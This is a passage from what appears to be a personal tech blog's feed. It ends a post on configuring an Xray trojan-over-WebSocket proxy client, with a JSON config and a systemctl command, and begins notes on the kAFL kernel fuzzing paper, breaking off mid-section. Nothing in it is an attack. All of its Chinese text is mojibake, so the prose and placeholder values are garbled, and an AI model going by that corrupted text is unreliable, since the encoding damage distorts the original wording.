class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">10808</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">10809</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„å¯†ç &quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/ä½ çš„å­è·¯å¾„&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨ xrayï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now xray.service</span><br></code></pre></td></tr></table></figure><p>æœ€åæ‰¾è‡ªå·±æ¡Œé¢ç¯å¢ƒå¯¹åº”çš„ Proxy è®¾ç½®å³å¯ï¼Œä»¥ä¸‹æ˜¯ Gnome ç¯å¢ƒä¸‹é…ç½®æˆåŠŸçš„ç•Œé¢ï¼š</p><p><img src="https://s2.loli.net/2024/09/19/QiM9D76dvE8nIl1.png" alt="è¿™æ˜¯ Gnome"></p><h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF. Whatâ€™s moreâ€¦"></a>0xFF. Whatâ€™s moreâ€¦</h1><p>è™½ç„¶è¯´è¿™ä¸ªæ–¹æ¡ˆç¡®ä¹æ˜¯é…ç½®æˆåŠŸäº†ï¼Œä»åŸç†ä¸Šçœ‹ä¼¼ä¹ä¹Ÿæ˜¯éå¸¸çš„å®‰å…¨ï¼Œä½†æ˜¯æœ€ç»ˆ <strong>è¿˜æ˜¯æ²¡æœ‰åŠæ³•åœ¨æ¾³æ´²çš„æ ¡å›­ç½‘é‡Œç©åŸç¥</strong> ï¼Œä¸»è¦åŸå› æ˜¯ <strong>å»¶è¿Ÿå®åœ¨æ˜¯å¤ªé«˜äº†</strong> â€¦â€¦</p><p>ä¸è¿‡è‡³å°‘åˆ°æœ€åè‡³å°‘æ˜¯æ”¶è·äº†ä¸€äº›è¿ç»´çš„å°æŠ€å·§ä¸æ˜¯ä¹ˆï¼šï¼‰</p><p><img src="https://s2.loli.net/2024/09/18/3NVGfOJLndohSEm.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™ä¸ªåŸç¥å•Šï¼Œèƒ½å¿ä½ä¸€ç§’ä¸ç©çš„éƒ½æ˜¯ç¥äººäº†&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="åŸç¥" scheme="https://arttnba3.github.io/tags/%E5%8E%9F%E7%A5%9E/"/>
    
    <category term="Firewall" scheme="https://arttnba3.github.io/tags/Firewall/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="NGINX" scheme="https://arttnba3.github.io/tags/NGINX/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x07ã€‘è®ºæ–‡ç¬”è®°ï¼škAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels</title>
    <link href="https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/"/>
    <id>https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/</id>
    <published>2024-07-30T11:53:16.000Z</published>
    <updated>2024-07-30T14:29:19.228Z</updated>
    
    <content type="html"><![CDATA[<p>Rabbitâ€™s adventures in kernel land</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>åœ¨<a href="https://arttnba3.cn/2023/10/27/PAPER-0X04-HYPER_CUBE/">ä¸Šä¸€ç¯‡è®ºæ–‡</a>å½“ä¸­æˆ‘ä»¬ä»‹ç»äº†è¿™ä¸ªä½œè€…é’ˆå¯¹è™šæ‹Ÿæœºè®¾è®¡çš„ fuzzerï¼Œè¿™æ¬¡æˆ‘ä»¬æ¥çœ‹ä»–çš„<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-schumilo.pdf">å¦ä¸€ç¯‡</a>ä½¿ç”¨ Intel PT æŠ€æœ¯è¾…åŠ©çš„ä¸€ä¸ªé’ˆå¯¹ OS kernel è®¾è®¡çš„ fuzzerï¼š<a href="https://github.com/RUB-SysSec/kAFL">kAFL</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>åŸºäºåé¦ˆçš„ fuzzing éå¸¸å¼ºå¤§ï¼Œä½†å¯¹å†…æ ¸è¿›è¡Œ fuzz éš¾ä»¥åº”ç”¨åé¦ˆæœºåˆ¶ï¼ˆå³ä»£ç è¦†ç›–ç‡æŒ‡å¯¼ï¼‰ï¼Œä¸”å†…æ ¸ crash å¯¼è‡´çš„ os é‡å¯ä¼šå½±å“ fuzz çš„æ€§èƒ½</p><p>æœ¬æ–‡ä½¿ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ä¸ Intel PTï¼ˆProcessor Traceï¼‰æŠ€æœ¯å¸¦æ¥ç‹¬ç«‹äº OS çš„ç¡¬ä»¶è¾…åŠ©çš„ fuzzing è§£å†³æ–¹æ¡ˆï¼Œè¿™ä½¿å¾—æˆ‘ä»¬åªéœ€è¦é¢å¤–å¼€å‘ä¸€å°éƒ¨åˆ†ä¸å†…æ ¸äº¤äº’çš„ç”¨æˆ·ç©ºé—´ç»„ä»¶ï¼›ä½œè€…è¿˜å¼€å‘äº† <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL æ¡†æ¶</a>ï¼Œå¹¶åœ¨ Linuxã€Windowsã€macOS ä¸Šæ‰¾åˆ°æ•°ä¸ªæ¼æ´</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p>ç»å…¸çš„ä¸ç”¨çœ‹çš„ç« èŠ‚</p></blockquote><p>è¿‡å»äººä»¬ä¸»è¦å…³æ³¨æ›´å®¹æ˜“è¢«åˆ©ç”¨çš„ç”¨æˆ·æ€åº”ç”¨çš„å®‰å…¨æ¼æ´ï¼Œè€Œéšç€ç”¨æˆ·æ€çš„å„ç§åŠ å›ºï¼Œå†…æ ¸å¼€å§‹æ›´åŠ å¸å¼•æ”»å‡»è€…</p><p>æ¨¡ç³Šæµ‹è¯•é•¿æœŸä»¥æ¥è¢«ç”¨æ¥å¯»æ‰¾æ¼æ´ï¼Œæœ€æ–°çš„åé¦ˆé©±åŠ¨å‹ fuzzer é€šè¿‡åé¦ˆæœºåˆ¶å­¦ä¹ è¾“å…¥çš„æœ‰è¶£æ€§å¹¶ä»¥æ­¤ç”Ÿæˆæ›´å¤šå¯èƒ½è§¦å‘æ–°è·¯å¾„çš„è¾“å…¥ï¼Œä½†æœ€ç«çš„ AFL ä»…é™äºç”¨æˆ·ç©ºé—´ï¼Œfuzz å†…æ ¸å­˜åœ¨ä¸€ç³»åˆ—é¢å¤–çš„æŒ‘æˆ˜ï¼šcrash ä¸ timeout éœ€è¦è™šæ‹ŸåŒ–æŠ€æœ¯æ•è·å¹¶ä¼˜é›…åœ°ç»§ç»­ã€å†…æ ¸ä»£ç å­˜åœ¨æ›´å¤šä¸ç¡®å®šæ€§ã€ç¼ºå°‘ fuzz å‘½ä»¤è¡Œç¨‹åºé‚£æ ·é€šè¿‡ stdin ç›´æ¥è¾“å…¥çš„ç®€æ˜“æ–¹æ³•ã€éƒ¨åˆ†å†…æ ¸ç»„ä»¶ä¸å¼€æºè€Œæ— æ³•åœ¨æ€§èƒ½ä¸æŸè€—çš„æƒ…å†µä¸‹æ’æ¡©</p><p>è¿‡å»çš„å†…æ ¸ fuzzing æ–¹æ³•ä¾èµ–äºç‰¹å®šçš„é©±åŠ¨æˆ–æ˜¯é‡ç¼–è¯‘ï¼Œä¸”ç”±äºä½¿ç”¨æ¨¡æ‹Ÿçš„ç¼˜æ•…é€Ÿåº¦éå¸¸æ…¢ï¼Œæˆ–æ˜¯éåé¦ˆé©±åŠ¨</p><p>æœ¬æ–‡ä»‹ç»ä¸€ç§æ— éœ€ ring0 ä»£ç ç”šè‡³ç‰¹å®šäº OS çš„ä»£ç ä¾¿èƒ½å¤Ÿå¯¹ä»»æ„ï¼ˆç”šè‡³é—­æºï¼‰x86-64 å†…æ ¸è¿›è¡Œ feedback fuzzing çš„æŠ€æœ¯ï¼Œå®ç°ä¸º kernel-AFLï¼ŒIntel PT æŠ€æœ¯æä¾›äº†æ§åˆ¶æµä¿¡æ¯ï¼Œä¸”ç”Ÿæˆåé¦ˆä¿¡æ¯çš„å¼€é”€æå°ï¼ˆ5%ï¼‰</p><p>æ€»è€Œè¨€ä¹‹ï¼Œæœ¬ç¯‡è®ºæ–‡è´¡çŒ®å¦‚ä¸‹ï¼š</p><ul><li><strong>OS independence</strong>ï¼šä½œè€…å±•ç¤ºäº†ä½¿ç”¨ VMM ç”Ÿæˆè¦†ç›–ç‡æ¥å¯¹å¤§éƒ¨åˆ†é—­æºå†…æ ¸ç»„ä»¶è¿›è¡Œåé¦ˆé©±åŠ¨ fuzzing æ˜¯å¯è¡Œçš„</li><li><strong>Hardware-assisted feedback</strong>ï¼šä½œè€…ä½¿ç”¨äº† Intel Process Trace æŠ€æœ¯ï¼Œå…¶å¼€é”€æå°</li><li><strong>Extensible and modular design</strong>ï¼šä½œè€…ä½¿ç”¨äº†æ¨¡å—åŒ–è®¾è®¡ï¼Œæ–¹ä¾¿æ”¯æŒå…¶ä»–çš„ x86 å†…æ ¸&#x2F;ç”¨æˆ·ç»„ä»¶</li><li><strong>kernel-AFL</strong>ï¼šä½œè€…ä½¿ç”¨è‡ªå·±çš„ç†å¿µå¼€å‘äº†åŸå‹ç³»ç»Ÿ <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL</a></li></ul><h1 id="0x02-Technical-Background"><a href="#0x02-Technical-Background" class="headerlink" title="0x02. Technical Background"></a>0x02. Technical Background</h1><p>æœ¬èŠ‚ä»‹ç»åç»­ç« èŠ‚æ¶‰åŠçš„ç¡¬ä»¶ç‰¹æ€§</p><h2 id="2-1-x86-64-Virtual-Memory-Layouts"><a href="#2-1-x86-64-Virtual-Memory-Layouts" class="headerlink" title="2.1 x86-64 Virtual Memory Layouts"></a>2.1 x86-64 Virtual Memory Layouts</h2><p>å†…æ 